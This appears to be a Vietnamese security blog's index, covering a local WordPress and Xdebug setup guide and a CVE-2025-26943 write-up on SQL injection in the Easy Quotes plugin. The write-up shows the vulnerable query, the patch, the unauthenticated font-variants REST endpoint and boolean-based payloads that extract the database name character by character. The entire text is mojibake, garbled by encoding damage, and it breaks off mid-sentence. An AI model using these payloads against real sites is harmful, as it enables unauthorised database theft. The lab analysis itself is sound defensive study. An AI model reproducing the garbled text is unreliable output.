Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦ Hiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress. CÃ³ 2 phiÃªn báº£n WordPress:\nWordPress.com Dá»‹ch vá»¥ hosting do Automattic cung cáº¥p Báº¡n chá»‰ cáº§n Ä‘Äƒng kÃ½ tÃ i khoáº£n, khÃ´ng pháº£i cÃ i Ä‘áº·t Háº¡n cháº¿ tÃ¹y chá»‰nh, muá»‘n nÃ¢ng cao thÃ¬ pháº£i tráº£ phÃ­ WordPress.org MÃ£ nguá»“n má»Ÿ, báº¡n tá»± táº£i vá» vÃ  cÃ i Ä‘áº·t lÃªn hosting/server riÃªng TÃ¹y chá»‰nh toÃ n diá»‡n, cÃ³ thá»ƒ cÃ i plugin, theme, viáº¿t code, táº¡o website theo Ã½ mÃ¬nh Ecosystem Core: CMS chÃ­nh Plugin: Má»™t pháº§n má»m bá»• sung cÃ³ thá»ƒ Ä‘Æ°á»£c cÃ i Ä‘áº·t trÃªn trang web WordPress Ä‘á»ƒ má»Ÿ rá»™ng chá»©c nÄƒng cá»§a nÃ³ vÃ  thÃªm cÃ¡c tÃ­nh nÄƒng má»›i Themes: Má»™t pháº§n má»m bá»• sung Ä‘áº¡i diá»‡n cho sá»± xuáº¥t hiá»‡n trá»±c quan vÃ  bá»‘ cá»¥c cá»§a má»™t trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hiá»‡n táº¡i hÆ¡n 40% website trÃªn toÃ n tháº¿ giá»›i cháº¡y WordPress NghÄ©a lÃ  hacker chá»‰ cáº§n tÃ¬m ra má»™t lá»— há»•ng phá»• biáº¿n =\u0026gt; cÃ³ thá»ƒ khai thÃ¡c hÃ ng triá»‡u site cÃ¹ng lÃºc Giá»‘ng nhÆ° â€œcÃ¡ nhiá»u thÃ¬ chÃ i á»Ÿ Ä‘Ã³â€ Plugin and Theme WordPress Core Ä‘Ã£ Ä‘Æ°á»£c xem xÃ©t trong 1 thá»i gian dÃ i bá»Ÿi hÃ ng ngÃ n developers vÃ  researchers. Káº¿t quáº£ lÃ  ráº¥t khÃ³ Ä‘á»ƒ káº» táº¥n cÃ´ng cÃ³ thá»ƒ Ä‘á»™t nháº­p vÃ o Tuy nhiÃªn, cÃ³ hÃ ng chá»¥c ngÃ n plugin vÃ  theme tá»« nhiá»u nguá»“n, cháº¥t lÆ°á»£ng khÃ´ng Ä‘á»“ng Ä‘á»u Ä‘Æ°á»£c sá»­ dá»¥ng Nhiá»u plugin code báº£o máº­t kÃ©m, khÃ´ng cÃ²n Ä‘Æ°á»£c cáº­p nháº­t. Hacker chá»‰ cáº§n scan plugin/theme Ä‘á»ƒ tÃ¬m version lá»—i thá»i, rá»“i khai thÃ¡c Setup WordPress for Hacking CÃ³ ráº¥t nhiá»u cÃ¡ch Ä‘á»ƒ setup WorkPress, tÃ¬m kiáº¿m báº±ng Google cÃ³ thá»ƒ cung cáº¥p nhiá»u bÃ i viáº¿t vá» nÃ³. á» Ä‘Ã¢y tÃ´i sáº½ setup trÃªn mÃ¡y áº£o Ubuntu (22.04):\nKhÃ´ng áº£nh hÆ°á»Ÿng Ä‘áº¿n cÃ¡c dá»‹ch vá»¥ cá»§a mÃ¡y tháº­t WordPress tÆ°Æ¡ng Ä‘á»‘i nháº¹ Ä‘á»ƒ sá»­ dá»¥ng trÃªn mÃ¡y áº£o Install and configure WordPress Install Dependencies CÃ i toÃ n bá»™ stack cáº§n thiáº¿t Ä‘á»ƒ cháº¡y WordPress (web server + database + PHP + cÃ¡c extension quan trá»ng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Táº£i vÃ  cÃ i mÃ£ nguá»“n WordPress vÃ o thÆ° má»¥c web.\n# Táº¡o folder Ä‘á»ƒ lÆ°u trá»¯ mÃ£ nguá»“n website sudo mkdir -p /srv/www # Äá»•i owner thÃ nh www-data, Ä‘Ã¢y lÃ  user máº·c Ä‘á»‹nh cá»§a Apache/Nginx Ä‘á»ƒ cháº¡y web server # Khi Apache/NGINX khá»Ÿi Ä‘á»™ng, nÃ³ khÃ´ng cháº¡y báº±ng root (nguy hiá»ƒm vÃ¬ cÃ³ toÃ n quyá»n há»‡ thá»‘ng), mÃ  sáº½ drop xuá»‘ng cháº¡y dÆ°á»›i quyá»n www-data. sudo chown www-data: /srv/www # Táº£i gÃ³i WordPress má»›i nháº¥t tá»« trang chÃ­nh thá»©c # Giáº£i nÃ©n vao thÆ°c má»¥c /srv/www Ä‘Æ°á»£c táº¡o á»Ÿ trÃªn curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ³ thá»ƒ táº£i phiÃªn báº£n cá»¥ thá»ƒ báº±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www CÃ i tá»« wordpress.org lÃ  cÃ¡ch chuáº©n nháº¥t vÃ  Ã­t rá»§i ro:\nUbuntu cÃ³ sáºµn package wordpress trong repo. NhÆ°ng nÃ³ thÆ°á»ng cÅ© hÆ¡n nhiá»u so vá»›i báº£n chÃ­nh thá»©c trÃªn wordpress.org Cá»™ng Ä‘á»“ng WordPress chá»‰ há»— trá»£ khi báº¡n dÃ¹ng báº£n chÃ­nh thá»©c tá»« wordpress.org, vÃ¬ náº¿u báº¡n gáº·p lá»—i do package cá»§a Ubuntu thÃ¬ há» khÃ´ng giáº£i quyáº¿t Ä‘Æ°á»£c. Configure Apache for WordPress Táº¡o file /etc/apache2/sites-available/wordpress.conf cáº¥u hÃ¬nh Apache cho WordPress:\n# Láº¯ng nghe trÃªn táº¥t cáº£ Ä‘á»‹a chá»‰ IP (*) táº¡i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # ThÆ° má»¥c gá»‘c cá»§a website (nÆ¡i chá»©a mÃ£ nguá»“n WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho phÃ©p file .htaccess ghi Ä‘Ã¨ má»™t sá»‘ thiáº¿t láº­p liÃªn quan Ä‘áº¿n báº£o máº­t vÃ  URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cáº­p thÆ° má»¥c, Apache sáº½ tÃ¬m file index.php Ä‘á»ƒ hiá»ƒn thá»‹. DirectoryIndex index.php # Cho phÃ©p táº¥t cáº£ má»i ngÆ°á»i truy cáº­p (cáº§n cho website public). Require all granted \u0026lt;/Directory\u0026gt; # RiÃªng thÆ° má»¥c wp-content (chá»©a plugin, theme, upload) cÅ©ng cho phÃ©p truy cáº­p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; KÃ­ch hoáº¡t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (táº¡o symlink tá»« /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau Ä‘Ã³ site wordpress sáº½ Ä‘Æ°á»£c Apache load khi restart. KÃ­ch hoáº¡t module rewrite:\nsudo a2enmod rewrite WordPress cáº§n module mod_rewrite Ä‘á»ƒ há»— trá»£ Pretty Permalinks (vÃ­ dá»¥ /blog/hello-world/ thay vÃ¬ ?p=123) VÃ´ hiá»‡u hÃ³a site máº·c Ä‘á»‹nh (Option):\nsudo a2dissite 000-default Apache máº·c Ä‘á»‹nh cÃ³ site 000-default.conf (chá»‰ hiá»ƒn thá»‹ \u0026ldquo;It works!\u0026rdquo;) Náº¿u khÃ´ng disable, site máº·c Ä‘á»‹nh cÃ³ thá»ƒ chiáº¿m port 80 trÆ°á»›c WordPress ğŸ‘‰ Hoáº·c náº¿u khÃ´ng muá»‘n disable, cÃ³ thá»ƒ thÃªm ServerName vÃ o VirtualHost WordPress Ä‘á»ƒ Apache phÃ¢n biá»‡t domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Muá»‘n cháº¡y Ä‘Æ°á»£c thÃ¬ pháº£i cáº¥u hÃ¬nh DNS hoáº·c sá»­a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload Táº£i láº¡i cáº¥u hÃ¬nh má»›i mÃ  khÃ´ng cáº§n dá»«ng server Configure database WordPress cáº§n má»™t cÆ¡ sá»Ÿ dá»¯ liá»‡u (MySQL/MariaDB) Ä‘á»ƒ lÆ°u:\nBÃ i viáº¿t, trang, menu NgÆ°á»i dÃ¹ng, máº­t kháº©u (hash) Cáº¥u hÃ¬nh site Plugins, themes settings Má»Ÿ MySQL vá»›i quyá»n root:\nsudo mysql -u root Cáº¥u hÃ¬nh MySQL:\n-- Táº¡o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Táº¡o user riÃªng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- Cáº¥p quyá»n cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- LÃ m má»›i láº¡i quyá»n mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- ThoÃ¡t mysql\u0026gt; quit Bye Khá»Ÿi Ä‘á»™ng láº¡i dá»‹ch vá»¥:\nsudo service mysql start Configure WordPress to connect to the database Copy file cáº¥u hÃ¬nh máº«u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi táº£i vá» cÃ³ sáºµn file wp-config-sample.php Báº¡n copy nÃ³ thÃ nh wp-config.php Ä‘á»ƒ lÃ m file cáº¥u hÃ¬nh chÃ­nh cho site Chá»‰nh sá»­a thÃ´ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ÄÃ¢y lÃ  3 dÃ²ng thay tháº¿ text trong file wp-config.php: database_name_here =\u0026gt; wordpress (tÃªn DB Ä‘Ã£ táº¡o á»Ÿ bÆ°á»›c trÆ°á»›c) username_here =\u0026gt; wordpress (user MySQL Ä‘Ã£ táº¡o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password Ä‘Ã£ set) Khi Apache cháº¡y WordPress, nÃ³ sáº½ Ä‘á»c file nÃ y Ä‘á»ƒ biáº¿t dÃ¹ng user nÃ o + DB nÃ o Ä‘á»ƒ káº¿t ná»‘i MySQL ThÃªm Secret Keys vÃ  Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php ğŸ‘‰ ÄÃ¢y lÃ  chuá»—i bÃ­ máº­t mÃ  WordPress dÃ¹ng Ä‘á»ƒ:\nMÃ£ hÃ³a session cookies Sinh ra token (nonce) chá»‘ng CSRF NgÄƒn cháº·n táº¥n cÃ´ng kiá»ƒu â€œknown secretâ€ (vÃ­ dá»¥ káº» táº¥n cÃ´ng Ä‘oÃ¡n Ä‘Æ°á»£c secret máº·c Ä‘á»‹nh Ä‘á»ƒ giáº£ máº¡o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay Ä‘á»•i nÃ³ báº±ng cÃ¡c chuá»—i random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy cáº­p http://localhost, Ä‘áº·t site title, username, password, email cho user admin\nSetup Debug on VSCode Äá»ƒ hiá»ƒu Ä‘Æ°á»£c luá»“ng cá»§a trang web cháº¡y vÃ  xá»­ lÃ­ á»Ÿ má»—i request, ta cáº§n pháº£i debug nÃ³.\nAdd PHP Debug extension on VS Code VÃ o Extensions (Ctrl+Shift+X) =\u0026gt; tÃ¬m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension nÃ y káº¿t ná»‘i vá»›i Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Kiá»ƒm tra cÃ i chÆ°a:\nphp -v Náº¿u cÃ³ dÃ²ng with Xdebug v3.x.x nghÄ©a lÃ  Ä‘Ã£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini ThÃªm vÃ o cuá»‘i file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port máº·c Ä‘á»‹nh má»›i cá»§a Xdebug v3 lÃ  9003.\nSau Ä‘Ã³ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Má»Ÿ thÆ° má»¥c chá»©a trang web wordpress báº±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; táº¡o file launch.json vá»›i ná»™i dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: Ã¡nh xáº¡ thÆ° má»¥c trong container/server (/srv/www/wordpress) vá» thÆ° má»¥c local cá»§a trong VS Code.\nNhÆ° váº­y lÃ  Ä‘Ã£ hoÃ n thÃ nh setup WordPress trÃªn local káº¿t há»£p Debug nÃ³ trÃªn VSCode.\nExtend Required Version Má»—i phiÃªn báº£n WordPress thÆ°á»ng Ä‘i kÃ¨m 1 phiÃªn báº£n PHP thÃ­ch há»£p. NÃªn kiá»ƒm tra tÃ­nh tÆ°Æ¡ng thÃ­ch nÃ y Ä‘á»ƒ quÃ¡ trÃ¬nh setup khÃ´ng bá»‹ lá»—i.\nWordPress Auto Update Tá»« WordPress 3.7 trá»Ÿ Ä‘i (2013), WordPress cÃ³ cÆ¡ cháº¿ tá»± Ä‘á»™ng cáº­p nháº­t (automatic background updates) cho:\nBáº£n vÃ¡ báº£o máº­t (security release). Báº£n báº£o trÃ¬ (maintenance release). KhÃ´ng tá»± Ä‘á»™ng update major version (trá»« khi báº­t rÃµ rÃ ng). Há»‡ thá»‘ng kiá»ƒm tra vá»›i server api.wordpress.org Ä‘á»ƒ xem cÃ³ báº£n vÃ¡ nÃ o má»›i sáº½ tá»± Ä‘á»™ng nÃ¢ng cáº¥p background lÃªn. Viá»‡c nÃ y diá»…n ra ráº¥t nhanh sau khi setup, nÃªn báº¡n tháº¥y code Ä‘á»•i khÃ¡c so vá»›i source gá»‘c.\nQuÃ¡ trÃ¬nh setup diá»…n ra khi truy cáº­p /wp-admin/install.php\nÄá»ƒ vÃ´ hiá»‡u hÃ³a cÆ¡ cháº¿ cáº­p nháº­t tá»± Ä‘á»™ng nÃ y, thÃªm dÃ²ng sau vÃ o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size Máº·c Ä‘á»‹nh, WordPress phá»¥ thuá»™c vÃ o cáº¥u hÃ¬nh PHP (upload_max_filesize, post_max_size, vÃ  Ä‘Ã´i khi cáº£ max_execution_time) Ä‘á»ƒ xÃ¡c Ä‘á»‹nh dung lÆ°á»£ng file tá»‘i Ä‘a cÃ³ thá»ƒ upload. TrÃªn nhiá»u hosting, giá»›i háº¡n nÃ y chá»‰ khoáº£ng 2MB â€“ 8MB, khÃ´ng Ä‘á»§ cho cÃ¡c plugin hiá»‡n Ä‘áº¡i.\nWhy Increase the Limit? Plugin dung lÆ°á»£ng lá»›n: CÃ¡c plugin nhÆ° WooCommerce extension, page builder, backup, hoáº·c security suite cÃ³ thá»ƒ náº·ng 20MB â€“ 100MB.\nTrÃ¡nh lá»—i upload: Náº¿u file .zip lá»›n hÆ¡n giá»›i háº¡n, báº¡n sáº½ gáº·p lá»—i:\nâ€œThe uploaded file exceeds the upload_max_filesize directive in php.iniâ€ Hoáº·c upload tháº¥t báº¡i. Thuáº­n tiá»‡n cho quáº£n trá»‹ viÃªn: CÃ³ thá»ƒ cÃ i trá»±c tiáº¿p qua Dashboard mÃ  khÃ´ng cáº§n FTP/SSH.\nHá»— trá»£ phÃ¡t triá»ƒn plugin: Plugin tá»± viáº¿t kÃ¨m nhiá»u thÆ° viá»‡n/asset cÃ³ thá»ƒ khÃ¡ náº·ng, viá»‡c tÄƒng giá»›i háº¡n giÃºp test dá»… dÃ ng hÆ¡n.\nHow to Increase Plugin Upload Size Sá»­a php.ini (náº¿u cÃ³ quyá»n server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Sá»­a file .htaccess (náº¿u dÃ¹ng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 ThÃªm vÃ o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); ğŸ‘‰ Lá»i khuyÃªn: Chá»‰ nÃªn Ä‘áº·t giá»›i háº¡n vá»«a Ä‘á»§ (64MB hoáº·c 128MB). TrÃ¡nh Ä‘áº·t quÃ¡ lá»›n Ä‘á»ƒ háº¡n cháº¿ nguy cÆ¡ bá»‹ upload file náº·ng gÃ¢y quÃ¡ táº£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦\u003c/li\u003e\n\u003cli\u003eHiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eCÃ³ 2 phiÃªn báº£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Easy Quotes cá»§a WordPress trÆ°á»›c phiÃªn báº£n 1.2.3. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) vÃ  v1.2.3(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  khÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡ khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } Báº£n vÃ¡ sá»­ dá»¥ng $wpdb-\u0026gt;prepare() thay vÃ¬ truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } CÃ³ nhiá»u hÃ m cÅ©ng Ä‘Æ°á»£c vÃ¡ báº±ng cÃ¡ch trÃªn, nhÆ°: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() Ä‘Ã£ Ä‘Æ°á»£c vÃ¡ nhÆ°ng nÃ³ khÃ´ng chá»©a dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng, nÃªn khÃ´ng cáº§n quan tÃ¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } How it work? Ta khai thÃ¡c lá»—i SQL Injection trong hÃ m get_family_data($family), cÃ¡c hÃ m cÃ²n láº¡i khai thÃ¡c tÆ°Æ¡ng tá»±.\nget_family_data() lÃ  hÃ m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } get_family_data() Ä‘Æ°á»£c gá»i trong 2 hÃ m get_family() vÃ  get_font_variants() cá»§a class Quotes_Data, Ä‘á»ƒ biáº¿t chÃºng sá»­ dá»¥ng á»Ÿ Ä‘Ã¢u, ta tÃ¬m kiáº¿n vá»›i tá»« khÃ³a get_family hoáº·c get_font_variants\nHÃ m get_font_variants() Ä‘Æ°á»£c gá»i trong hÃ m rest_route_callback_font_variants() cá»§a class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } HÃ m khá»Ÿi táº¡o cá»§a class Quotes_Rest_Route sá»­ dá»¥ng add_action(hook_name, callback) vá»›i hook_name lÃ  rest_api_init Ä‘á»ƒ Ä‘Äƒng kÃ½ cÃ¡c endpoint tÃ¹y chá»‰nh vá»›i REST API System cá»§a WordPress\nCallback rest_api_init sá»­ dá»¥ng register_rest_route nhiá»u láº§n Ä‘á»ƒ táº¡o cÃ¡c endpoint dÆ°á»›i namespace layart/v1\nrest_route_callback_font_variants lÃ  callback cá»§a endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family máº·c Ä‘á»‹nh lÃ  Shadows Into Light náº¿u khÃ´ng Ä‘Æ°á»£c truyá»n trong param.\nExploit Detect SQLi Ta thá»­ ká»¹ thuáº­t Boolean-based SQL Injection Ä‘á»ƒ kiá»ƒm tra xem tham sá»‘ family cÃ³ dá»… bá»‹ chÃ¨n lá»‡nh SQL hay khÃ´ng.\nTrue request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='1' luÃ´n Ä‘Ãºng =\u0026gt; query há»£p lá»‡, tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng.\nFalse request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='2' luÃ´n sai =\u0026gt; query khÃ´ng khá»›p =\u0026gt; tráº£ vá» [].\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nDatabase name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w\nResponse tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng =\u0026gt; kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w\nKhi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Conclusion Lá»— há»•ng CVE-2025-26943 trong plugin WordPress Easy Quotes trÆ°á»›c phiÃªn báº£n 1.2.3 xuáº¥t phÃ¡t tá»« viá»‡c khÃ´ng sá»­ dá»¥ng cÆ¡ cháº¿ chuáº©n bá»‹ truy váº¥n ($wpdb-\u0026gt;prepare) mÃ  truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u lá»‡nh SQL dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nBáº£n vÃ¡ chÃ­nh thá»©c Ä‘Ã£ thay tháº¿ viá»‡c ná»‘i chuá»—i báº±ng 